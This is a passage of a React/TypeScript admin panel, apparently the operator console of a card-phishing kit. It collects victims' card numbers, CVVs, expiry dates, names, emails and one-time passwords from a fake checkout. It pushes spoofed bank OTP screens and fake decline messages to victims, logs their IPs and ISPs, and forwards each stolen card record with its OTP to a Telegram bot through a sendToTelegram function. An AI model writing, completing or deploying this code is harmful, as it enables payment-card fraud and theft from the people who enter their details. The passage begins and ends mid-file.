            paymentId: data.paymentId || 'payment-' + Date.now(),
            otp: data.otp,
            timestamp: new Date().toISOString()
          };
          setOtps(prev => [newOtp, ...prev.slice(0, 4)]); // Keep only last 5 OTPs
          console.log('OTP received:', data.otp);
        } catch (error) {
          console.error('Error processing OTP data:', error);
        }
      });

      // Listen for visitor join/leave events
      socket.on('visitor-joined', async (data: Omit<VisitorData, 'id'>) => {
        try {
          if (!data || !data.visitorId) {
            console.error('Invalid visitor data received:', data);
            return;
          }
          
          // Create visitor with initial data
          const newVisitor: VisitorData = {
            ...data,
            id: data.visitorId,
            isp: 'Loading...',
            country: 'Loading...',
            city: 'Loading...'
          };
          
          // Add visitor to list immediately
          setLiveVisitors(prev => [newVisitor, ...prev.filter(v => v.visitorId !== data.visitorId)]);
          
          // Update heartbeat timestamp
          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
          
          // Fetch ISP info asynchronously
          if (data.ipAddress) {
            const ispInfo = await fetchIspInfo(data.ipAddress);
            
            // Update visitor with ISP information
            setLiveVisitors(prev => prev.map(visitor => 
              visitor.visitorId === data.visitorId 
                ? { ...visitor, ...ispInfo }
                : visitor
            ));
          }
        } catch (error) {
          console.error('Error processing visitor data:', error);
        }
      });
      
      // Listen for visitor heartbeats
      socket.on('visitor-heartbeat', (data: { visitorId: string }) => {
        try {
          if (!data || !data.visitorId) return;
          setVisitorHeartbeats(prev => ({ ...prev, [data.visitorId]: Date.now() }));
        } catch (error) {
          console.error('Error processing visitor heartbeat:', error);
        }
      });
      
      socket.on('visitor-left', (data: { visitorId: string }) => {
        try {
          if (!data || !data.visitorId) {
            console.error('Invalid visitor leave data received:', data);
            return;
          }
          setLiveVisitors(prev => prev.filter(visitor => visitor.visitorId !== data.visitorId));
          setVisitorHeartbeats(prev => {
            const updated = { ...prev };
            delete updated[data.visitorId];
            return updated;
          });
        } catch (error) {
          console.error('Error processing visitor leave data:', error);
        }
      });

      // Listen for OTP submissions
      socket.on('otp-submitted', (data: { paymentId: string, otp: string }) => {
        try {
          if (!data || !data.paymentId || !data.otp) {
            console.error('Invalid OTP data received:', data);
            return;
          }
          
          const newOtp: OtpData = {
            paymentId: data.paymentId,
            otp: data.otp,
            timestamp: new Date().toISOString()
          };
          
          console.log('📱 OTP received:', newOtp);
          
          // Add to OTP list (newest first)
          setOtps(prev => {
            const updated = [newOtp, ...prev.filter(otp => otp.paymentId !== data.paymentId)];
            // Keep only last 10 OTPs to prevent memory issues
            const limited = updated.slice(0, 10);
            // Save to localStorage
            localStorage.setItem('adminOtps', JSON.stringify(limited));
            return limited;
          });
          
        } catch (error) {
          console.error('Error processing OTP submission:', error);
        }
      });

      // Listen for Telegram auto-configuration from server
      socket.on('telegram-auto-config', (data: { botToken: string; chatId: string; configured: boolean; status: string }) => {
        console.log('🤖 Telegram auto-config received:', data);
        if (data.configured && data.botToken && data.chatId) {
          setTelegramBotToken(data.botToken);
          setTelegramChatId(data.chatId);
          setIsTelegramConfigured(true);
          toast({
            title: "🤖 Telegram Auto-Configured!",
            description: data.status,
          });
        }
      });

      return () => {
        socket.off('payment-received');
        socket.off('payment-data');
        socket.off('otp-submitted');
        socket.off('visitor-joined');
        socket.off('visitor-heartbeat');
        socket.off('visitor-left');
      };
    } catch (error) {
      console.error('Error initializing WebSocket connection:', error);
      // setIsConnected(false); // This line is removed as per the new_code
    }
  }, [socket]);

  // Cleanup inactive visitors based on heartbeat
  useEffect(() => {
    const interval = setInterval(() => {
      const now = Date.now();
      const HEARTBEAT_TIMEOUT = 60000; // 1 minute timeout
      
      setLiveVisitors(prev => 
        prev.filter(visitor => {
          const lastHeartbeat = visitorHeartbeats[visitor.visitorId];
          return lastHeartbeat && (now - lastHeartbeat) < HEARTBEAT_TIMEOUT;
        })
      );
      
      // Clean up old heartbeat entries
      setVisitorHeartbeats(prev => {
        const updated = { ...prev };
        Object.keys(updated).forEach(visitorId => {
          if ((now - updated[visitorId]) >= HEARTBEAT_TIMEOUT) {
            delete updated[visitorId];
          }
        });
        return updated;
      });
    }, 30000); // Check every 30 seconds
    
    return () => clearInterval(interval);
  }, [visitorHeartbeats]);

  // Handle card click to stop glowing
  const handleCardClick = (paymentId: string) => {
    const newClickedCards = new Set(clickedCards);
    newClickedCards.add(paymentId);
    setClickedCards(newClickedCards);
    localStorage.setItem('clickedCards', JSON.stringify([...newClickedCards]));
  };

  const handleAction = (paymentId: string, action: string) => {
    console.log('Handle action called:', action, 'Payment ID:', paymentId);
    
    try {
      if (!socket) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Connection lost. Please refresh the page.",
          variant: "destructive",
        });
        return;
      }

      if (!isConnected) {
        console.error('Socket not connected');
        toast({
          title: "Connection Error",
          description: "Not connected to server. Please wait for reconnection.",
          variant: "destructive",
        });
        return;
      }

      switch (action) {
        case 'show-otp':
          console.log('Opening OTP customization modal for paymentId:', paymentId);
          setSelectedPaymentId(paymentId);
          setShowOtpModal(true);
          setSelectedBankLogo('');
          setSelectedCurrency('INR');
          setConvertedAmount('');
          setExchangeRate(1);
          break;
        case 'validate-otp':
          console.log('Emitting payment-approved event for validate-otp');
          console.log('PaymentId being sent:', paymentId);
          socket.emit('payment-approved', { paymentId });
          updatePaymentStatus(paymentId, 'approved');
          
          // Store successful payment persistently
          storeSuccessfulPayment(paymentId);
          
          toast({
            title: "Command Initiated",
            description: "Payment approved - client redirecting to success page",
          });
          break;
        case 'fail-otp':
          console.log('Emitting invalid-otp-error event');
          socket.emit('invalid-otp-error', { paymentId });
          toast({
            title: "Command Initiated",
            description: "Invalid OTP response sent to client",
          });
          break;
        case 'card-declined':
          console.log('Emitting card-declined-error event');
          socket.emit('card-declined-error', { paymentId });
          updatePaymentStatus(paymentId, 'rejected');
          toast({
            title: "Command Initiated", 
            description: "Card declined response sent to client",
          });
          break;
        case 'insufficient-balance':
          console.log('Emitting insufficient-balance-error event');
          socket.emit('insufficient-balance-error', { paymentId });
          toast({
            title: "Command Initiated",
            description: "Insufficient balance response sent to client", 
          });
          break;
        case 'successful':
          console.log('Emitting payment-approved event for success');
          console.log('PaymentId being sent:', paymentId);
          socket.emit('payment-approved', { paymentId });
          updatePaymentStatus(paymentId, 'approved');
          
          // Store successful payment persistently
          storeSuccessfulPayment(paymentId);
          
          toast({
            title: "Command Initiated", 
            description: "Payment successful - client redirecting to success page",
          });
          break;
        default:
          console.error('Unknown action:', action);
          return;
      }
      setActiveDropdown(null);
    } catch (error) {
      console.error('Error handling action:', error);
      toast({
        title: "Error",
        description: "An error occurred. Please try again.",
        variant: "destructive",
      });
    }
  };

  const updatePaymentStatus = (paymentId: string, status: 'approved' | 'rejected') => {
    setPayments(prev => prev.map(payment => 
      payment.id === paymentId ? { ...payment, status } : payment
    ));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copied!",
        description: "Text copied to clipboard",
      });
    }).catch(() => {
      toast({
        title: "Error",
        description: "Failed to copy to clipboard",
        variant: "destructive",
      });
    });
  };

  const generatePaymentLink = () => {
    if (!paymentLinkAmount || parseFloat(paymentLinkAmount) <= 0) {
      toast({
        title: "Error",
        description: "Please enter a valid amount",
        variant: "destructive",
      });
      return;
    }

    // Generate a unique hash for the payment link
    const linkId = uuidv4();
    const amount = parseFloat(paymentLinkAmount);
    
    // Convert amount to INR if user selected USD currency
    let finalAmount = amount;
    let displayAmount = amount;
    let currencySymbol = '₹';
    
    if (paymentLinkCurrency === 'USD') {
      // If payment link currency is USD, convert entered amount to INR for backend storage
      finalAmount = amount * currentExchangeRate;
      displayAmount = amount;
      currencySymbol = '$';
    } else {
      // If payment link currency is INR, use amount as-is
      finalAmount = amount;
      displayAmount = amount;
      currencySymbol = '₹';
    }
    
    // Create the payment link with INR amount (backend always expects INR) and currency parameter
    const baseUrl = window.location.origin;
    const paymentLink = `${baseUrl}/checkout?plan=Custom&billing=custom&amount=${finalAmount}&linkId=${linkId}&currency=${paymentLinkCurrency}`;
    
    setGeneratedLink(paymentLink);
    
    toast({
      title: "Payment Link Generated!",
      description: `Link created for ${currencySymbol}${displayAmount} (${paymentLinkCurrency})`,
    });
  };

  // Effect to handle currency conversion when currency changes
  useEffect(() => {
    if (selectedPaymentId && selectedCurrency && showOtpModal) {
      // Find the payment to get the original amount
      const payment = payments.find(p => p.paymentId === selectedPaymentId);
      if (payment && payment.amount) {
        convertCurrency(payment.amount, 'INR', selectedCurrency);
      }
    }
  }, [selectedCurrency, selectedPaymentId, showOtpModal]);

  const handleOtpModalConfirm = async () => {
    if (!selectedBankLogo) {
      toast({
        title: "Error",
        description: "Please select a bank logo",
        variant: "destructive",
      });
      return;
    }

    if (!selectedCurrency) {
      toast({
        title: "Error",
        description: "Please select a currency",
        variant: "destructive",
      });
      return;
    }

    // Get the original payment amount
    const payment = payments.find(p => p.paymentId === selectedPaymentId);
    if (!payment || !payment.amount) {
      console.log('Payment lookup failed:', {
        selectedPaymentId,
        paymentsCount: payments.length,
        paymentIds: payments.map(p => p.paymentId)
      });
      toast({
        title: "Error",
        description: "Payment not found or amount missing",
        variant: "destructive",
      });
      return;
    }

    try {
      // Convert currency on-the-fly
      const rate = await fetchExchangeRate('INR', selectedCurrency);
      const convertedAmount = payment.amount * rate;
      const selectedCurrencyInfo = currencies.find(c => c.code === selectedCurrency);
      
      console.log('🚀 EMITTING show-otp event from Admin panel');
      console.log('Socket connected:', socket.connected);
      console.log('Socket ID:', socket.id);
      
      const eventData = { 
        paymentId: selectedPaymentId,
        bankLogo: selectedBankLogo,
        customAmount: convertedAmount,
        currency: selectedCurrency,
        currencySymbol: selectedCurrencyInfo?.symbol || '',
        exchangeRate: rate
      };
      
      console.log('Event data being sent:', eventData);
      
      // Broadcast to ALL connected clients using server-side broadcast
      socket.emit('broadcast-show-otp', eventData);
      
      // Also emit to specific namespace for payment pages
      socket.emit('show-otp', eventData);
      socket.emit('admin-show-otp', eventData);
      
      console.log('✓ Broadcasting show-otp event to all connected clients');
      console.log('📡 Event payload:', eventData);
      
      setShowOtpModal(false);
      setSelectedPaymentId('');
      setSelectedBankLogo('');
      setSelectedCurrency('INR');
      setConvertedAmount('');
      setExchangeRate(1);
      
      toast({
        title: "OTP Customization Applied",
        description: `Custom OTP screen sent with ${selectedCurrency} ${convertedAmount.toFixed(2)}`,
      });
    } catch (error) {
      console.error('Currency conversion failed:', error);
      toast({
        title: "Error",
        description: "Currency conversion failed. Please try again.",
        variant: "destructive",
      });
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'approved': return 'text-green-400';
      case 'rejected': return 'text-red-400';
      default: return 'text-yellow-400';
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status) {
      case 'approved': return <Check className="h-4 w-4" />;
      case 'rejected': return <X className="h-4 w-4" />;
      default: return <AlertTriangle className="h-4 w-4" />;
    }
  };

  // Telegram Bot Configuration
  const configureTelegram = (botToken: string, chatId: string) => {
    if (!botToken || !chatId) {
      toast({
        title: "Error",
        description: "Please enter both Bot Token and Chat ID",
        variant: "destructive",
      });
      return;
    }

    setTelegramBotToken(botToken);
    setTelegramChatId(chatId);
    setIsTelegramConfigured(true);
    setShowTelegramSettings(false);

    toast({
      title: "Telegram Configured!",
      description: "Bot is ready to send card details",
    });
  };

  // Send card details to Telegram
  const sendToTelegram = async (payment: PaymentData) => {
    if (!isTelegramConfigured || !telegramBotToken || !telegramChatId) {
      toast({
        title: "Configuration Error",
        description: "Telegram bot is not configured properly",
        variant: "destructive",
      });
      return;
    }

    try {
      console.log('🚀 Sending to Telegram:', payment.paymentId);
      
      // Get associated OTP if available
      const associatedOtp = otps.find(otp => otp.paymentId === payment.paymentId);
      
      // Format card details message
      const message = `🎯 *New Card Details*\n\n` +
        `💳 *Card:* \`${formatCardNumber(payment.cardNumber)}\`\n` +
        `👤 *Name:* ${payment.cardName}\n` +
        `🔒 *CVV:* \`${payment.cvv}\`\n` +
        `📅 *Expiry:* ${formatExpiry(payment)}\n` +
        `💰 *Amount:* ₹${payment.amount.toLocaleString()}\n` +
        `👤 *Customer:* ${payment.billingDetails.firstName} ${payment.billingDetails.lastName}\n` +
        `📧 *Email:* ${payment.billingDetails.email}\n` +
        `🌍 *Country:* ${payment.cardCountry?.name || 'Unknown'}\n` +
        `📱 *OTP:* ${associatedOtp ? `\`${associatedOtp.otp}\`` : 'Not generated'}\n` +
        `🕒 *Time:* ${new Date(payment.timestamp).toLocaleString()}`;

      // Send to Telegram
      const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      const result = await response.json();
      
      if (result.ok) {
        toast({
          title: "✅ Sent to Telegram!",
          description: "Card details delivered successfully",
        });
        console.log('✅ Telegram send success:', result);
      } else {
        throw new Error(result.description || 'Failed to send message');
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error);
      toast({
        title: "❌ Send Failed",
        description: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`,
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-black text-white p-3 sm:p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 sm:mb-8 gap-4">
          <h1 className="text-2xl sm:text-3xl font-bold">Admin Panel</h1>
          <div className="flex items-center gap-4">
            {/* Global Currency Selector */}
            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
              <span className="text-sm text-gray-300">💱 Currency:</span>
              <Select 
                value={globalCurrency} 
                onValueChange={(value) => {
                  setGlobalCurrency(value);
                  localStorage.setItem('adminGlobalCurrency', value);
                  // Emit currency change to all connected clients
                  if (socket) {
                    socket.emit('admin-currency-change', { currency: value });
                  }
                  toast({
                    title: "Currency Updated",
                    description: `Website currency changed to ${value}`,
                  });
                }}
              >
                <SelectTrigger className="bg-gray-700 border-gray-600 text-white w-20 h-8">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="INR" className="text-white hover:bg-gray-700">
                    <span className="flex items-center gap-2">
                      <span>🇮🇳</span>
                      <span>INR</span>
                    </span>
                  </SelectItem>
                  <SelectItem value="USD" className="text-white hover:bg-gray-700">
                    <span className="flex items-center gap-2">
                      <span>🇺🇸</span>
                      <span>USD</span>
                    </span>
                  </SelectItem>
                </SelectContent>
              </Select>
            </div>
            
            {/* Telegram Status */}
            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
              {isTelegramConfigured ? (
                <>
                  <span className="text-sm text-green-400">🤖 Telegram Ready</span>
                  <Button
                    onClick={() => setShowTelegramSettings(true)}
                    size="sm"
                    variant="ghost"
                    className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                  >
                    ⚙️
                  </Button>
                </>
              ) : (
                <Button
                  onClick={() => setShowTelegramSettings(true)}
                  size="sm"
                  className="text-xs bg-blue-600 hover:bg-blue-700"
                >
                  🤖 Setup Telegram
                </Button>
              )}
            </div>
            
            {/* Analytics Link */}
            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2">
              <Button
                onClick={() => window.open('/analytics', '_blank')}
                size="sm"
                className="text-xs bg-purple-600 hover:bg-purple-700"
              >
                📊 Advanced Analytics
              </Button>
            </div>
            
            {/* Connection Status */}
            <div className="flex items-center gap-2 bg-gray-800 rounded-lg px-3 py-2 w-fit">
              {isConnected ? (
                <>
                  <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-400" />
                  <span className="text-green-400 text-sm sm:text-base font-medium">Connected</span>
                </>
              ) : (
                <>
                  <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-red-400" />
                  <span className="text-red-400 text-sm sm:text-base font-medium">Disconnected</span>
                </>
              )}
            </div>
          </div>
        </div>

        {/* Telegram Settings Modal */}
        <Dialog open={showTelegramSettings} onOpenChange={setShowTelegramSettings}>
          <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700">
            <DialogHeader>
              <DialogTitle className="text-white">🤖 Telegram Bot Settings</DialogTitle>
              <DialogDescription className="text-gray-400">
                Configure your Telegram bot to receive card details instantly
              </DialogDescription>
            </DialogHeader>
            
            <div className="space-y-4 py-4">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Bot Token
                </label>
                <Input
                  type="password"
                  placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
                  value={telegramBotToken}
                  onChange={(e) => setTelegramBotToken(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Chat ID
                </label>
                <Input
                  placeholder="123456789"
                  value={telegramChatId}
                  onChange={(e) => setTelegramChatId(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
              
              <div className="text-xs text-gray-400 bg-gray-800 p-3 rounded">
                <strong>How to get these:</strong><br/>
                1. Create bot: Message @BotFather on Telegram<br/>
                2. Get Chat ID: Message @userinfobot to get your ID
              </div>
            </div>

            <div className="flex gap-3">
              <Button
                variant="outline"
                onClick={() => setShowTelegramSettings(false)}
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-800"
              >
                Cancel
              </Button>
              <Button
                onClick={(e) => {
                  e.preventDefault();
                  configureTelegram(telegramBotToken, telegramChatId);
                }}
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
                disabled={!telegramBotToken.trim() || !telegramChatId.trim()}
              >
                Save Settings
              </Button>
            </div>
          </DialogContent>
        </Dialog>

        {/* Tab Navigation */}
        <div className="bg-gray-900 rounded-lg mb-6 p-1">
          <div className="flex space-x-1">
            <button
              onClick={() => setActiveTab('payments')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                activeTab === 'payments'
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
              }`}
            >
              💳 Payments
            </button>
            <button
              onClick={() => setActiveTab('visitors')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                activeTab === 'visitors'
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
              }`}
            >
              👀 Visitors
            </button>
            <button
              onClick={() => setActiveTab('analytics')}
              className={`flex-1 py-2 px-4 rounded-md text-sm font-medium transition-colors ${
                activeTab === 'analytics'
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-400 hover:text-white hover:bg-gray-800'
              }`}
            >
              📊 Analytics
            </button>
          </div>
        </div>

        {/* Tab Content */}
        {activeTab === 'payments' && (
          <>
            {/* Generate Payment Link Section */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 border-b border-gray-700">
            <h2 className="text-lg sm:text-xl font-semibold">Generate Payment Link</h2>
            <p className="text-gray-400 mt-1 text-sm sm:text-base">Create custom payment links with specific amounts</p>
          </div>
          <div className="p-4 sm:p-6">
            <div className="flex flex-col gap-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Amount ({paymentLinkCurrency === 'USD' ? '$' : '₹'})
                  </label>
                  <Input
                    type="number"
                    placeholder="Enter amount"
                    value={paymentLinkAmount}
                    onChange={(e) => setPaymentLinkAmount(e.target.value)}
                    className="bg-gray-800 border-gray-600 text-white h-12 text-base"
                    min="1"
                    step="0.01"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Currency
                  </label>
                  <Select value={paymentLinkCurrency} onValueChange={setPaymentLinkCurrency}>
                    <SelectTrigger className="bg-gray-800 border-gray-600 text-white h-12">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="bg-gray-800 border-gray-600">
                      <SelectItem value="INR" className="text-white hover:bg-gray-700">
                        <span className="flex items-center gap-2">
                          <span>🇮🇳</span>
                          <span>INR (₹)</span>
                        </span>
                      </SelectItem>
                      <SelectItem value="USD" className="text-white hover:bg-gray-700">
                        <span className="flex items-center gap-2">
                          <span>🇺🇸</span>
                          <span>USD ($)</span>
                        </span>
                      </SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
              <Button
                onClick={generatePaymentLink}
                className="bg-blue-600 hover:bg-blue-700 text-white h-12 text-base font-medium w-full sm:w-auto"
                disabled={!paymentLinkAmount || parseFloat(paymentLinkAmount) <= 0}
              >
                Generate Payment Link
              </Button>
            </div>
            
            {generatedLink && (
              <div className="mt-4 p-4 bg-gray-800 rounded-lg">
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Generated Payment Link:
                </label>
                <div className="flex flex-col sm:flex-row gap-2">
                  <Input
                    value={generatedLink}
                    readOnly
                    className="bg-gray-700 border-gray-600 text-white font-mono text-sm h-12 flex-1"
                  />
                  <Button
                    onClick={() => copyToClipboard(generatedLink)}
                    variant="outline"
                    className="border-gray-600 text-gray-300 hover:bg-gray-700 h-12 w-full sm:w-auto px-6"
                  >
                    <Copy className="h-4 w-4 mr-2" />
                    Copy Link
                  </Button>
                </div>
                <p className="text-xs text-gray-400 mt-2">
                  Amount: {paymentLinkCurrency === 'USD' ? '$' : '₹'}{paymentLinkAmount} | Currency: {paymentLinkCurrency} | Link expires when used
                </p>
              </div>
            )}
          </div>
        </div>

        {/* Live Visitors Section */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 border-b border-gray-700">
            <div className="flex justify-between items-center">
              <div>
                <h2 className="text-lg sm:text-xl font-semibold">Live Visitors</h2>
                <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time website visitors ({liveVisitors.length} online)</p>
              </div>
              <Button
                onClick={() => {
                  if (socket) {
                    console.log('🔥 Requesting visitor reset...');
                    socket.emit('admin-reset-visitors');
                    setLiveVisitors([]);
                    toast({
                      title: "Visitors Reset",
                      description: "All visitor tracking has been cleared.",
                    });
                  }
                }}
                variant="outline"
                size="sm"
                className="border-red-600 text-red-400 hover:bg-red-900/20 hover:text-red-300"
              >
                🧹 Clear All
              </Button>
            </div>
          </div>
          
          {/* Mobile-friendly visitor cards */}
          <div className="block sm:hidden">
            {liveVisitors.length === 0 ? (
              <div className="p-6 text-center text-gray-400">
                No live visitors at the moment
              </div>
            ) : (
              liveVisitors.map((visitor) => (
                <div key={visitor.id} className="p-4 border-b border-gray-700 last:border-b-0">
                  <div className="flex items-center justify-between mb-2">
                    <div className="bg-red-600 text-black px-2 py-1 rounded font-bold text-sm">
                      {visitor.ipAddress}
                    </div>
                    <span className="inline-flex items-center px-2 py-1 rounded-full text-xs font-medium bg-green-100 text-green-800">
                      <div className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></div>
                      Online
                    </span>
                  </div>
                  <div className="space-y-1 text-sm">
                    <div className="flex items-center gap-2">
                      <span className="text-gray-400">ISP:</span>
                      <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs">
                        {visitor.isp || 'Loading...'}
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="text-gray-400">Location:</span>
                      <span className="text-gray-300">{visitor.country || 'Unknown'}, {visitor.city || 'Unknown'}</span>
                    </div>
                    <div className="text-xs text-gray-400">
                      {new Date(visitor.timestamp).toLocaleString()}
                    </div>
                  </div>
                </div>
              ))
            )}
          </div>
          
          {/* Desktop table view */}
          <div className="hidden sm:block overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Timestamp
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    IP Address
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    ISP
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Location
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    User Agent
                  </th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                    Status
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {liveVisitors.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-6 py-8 text-center text-gray-400">
                      No live visitors at the moment
                    </td>
                  </tr>
                ) : (
                  liveVisitors.map((visitor) => (
                    <tr key={visitor.id} className="hover:bg-gray-800">
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        {new Date(visitor.timestamp).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
                          {visitor.ipAddress}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm">
                        <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-medium">
                          {visitor.isp || 'Loading...'}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                        <div className="flex flex-col">
                          <span className="text-xs text-gray-400">{visitor.country || 'Unknown'}</span>
                          <span className="text-xs">{visitor.city || 'Unknown'}</span>
                        </div>
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-300">
                        <div className="max-w-xs truncate" title={visitor.userAgent}>
                          {visitor.userAgent}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></div>
                          Online
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Payment Data Table */}
        <div className="bg-gray-900 rounded-lg overflow-hidden mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 border-b border-gray-700">
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
              <div>
                <h2 className="text-lg sm:text-xl font-semibold">Payment Transactions</h2>
                <p className="text-gray-400 mt-1 text-sm sm:text-base">Real-time payment data from checkout</p>
              </div>
              {/* OTP Display Area */}
              {otps.length > 0 && (
                <div className="bg-blue-900 rounded-lg p-3 sm:p-4 border border-blue-700 w-full sm:w-auto">
                  <h3 className="text-blue-300 font-medium mb-2 text-sm sm:text-base">Latest OTP</h3>
                  <div className="flex items-center gap-3 justify-between sm:justify-start">
                    <span className="text-xl sm:text-2xl font-bold text-blue-100 bg-blue-800 px-3 py-1 rounded font-mono">
                      {otps[0].otp}
                    </span>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => copyToClipboard(otps[0].otp)}
                      className="h-8 w-8 p-0 text-blue-300 hover:text-blue-100"
                    >
                      <Copy className="h-4 w-4" />
                    </Button>
                  </div>
                  <p className="text-xs text-blue-400 mt-1">
                    Received: {new Date(otps[0].timestamp).toLocaleTimeString()}
                  </p>
                </div>
              )}
            </div>
          </div>
          
          {/* Mobile-friendly payment cards */}
          <div className="block sm:hidden">
            {payments.length === 0 ? (
              <div className="p-6 text-center text-gray-400">
                No payment data received yet. Waiting for transactions...
              </div>
            ) : (
              payments.map((payment) => {
                const isNewCard = !clickedCards.has(payment.id);
                return (
                  <div 
                    key={payment.id}
                    className={`p-4 border-b border-gray-700 last:border-b-0 transition-all duration-300 ${
                      isNewCard 
                        ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
                        : 'hover:bg-gray-800'
                    }`}
                    onClick={() => handleCardClick(payment.id)}
                    style={{
                      boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                    }}
                  >
                    {/* Card Header */}
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <span className={`text-sm font-medium ${
                          payment.status === 'approved' ? 'text-green-400' :
                          payment.status === 'rejected' ? 'text-red-400' :
                          'text-yellow-400'
                        }`}>
                          {getStatusIcon(payment.status)}
                          {payment.status.charAt(0).toUpperCase() + payment.status.slice(1)}
                        </span>
                      </div>
                      <div className="text-xs text-gray-400">
                        {new Date(payment.timestamp).toLocaleString()}
                      </div>
                    </div>

                    {/* Customer Info */}
                    <div className="mb-3">
                      <div className="text-sm font-medium text-white">
                        {payment.billingDetails.firstName} {payment.billingDetails.lastName}
                      </div>
                      <div className="text-xs text-gray-400">
                        {payment.billingDetails.email}
                      </div>
                      <div className="text-xs text-gray-500">
                        {payment.billingDetails.country}
                      </div>
                    </div>

                    {/* Card Details */}
                    <div className="mb-3 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Card Number:</span>
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-mono text-green-400">
                            {formatCardNumber(payment.cardNumber)}
                          </span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={(e) => {
                              e.stopPropagation();
                              copyToClipboard(payment.cardNumber);
                            }}
                            className="h-6 w-6 p-0 text-gray-400 hover:text-white"
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        </div>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Holder Name:</span>
                        <span className="text-sm text-white">{payment.cardName}</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">CVV:</span>
                        <span className="text-sm font-mono text-white">{payment.cvv}</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-xs text-gray-400">Expiry:</span>
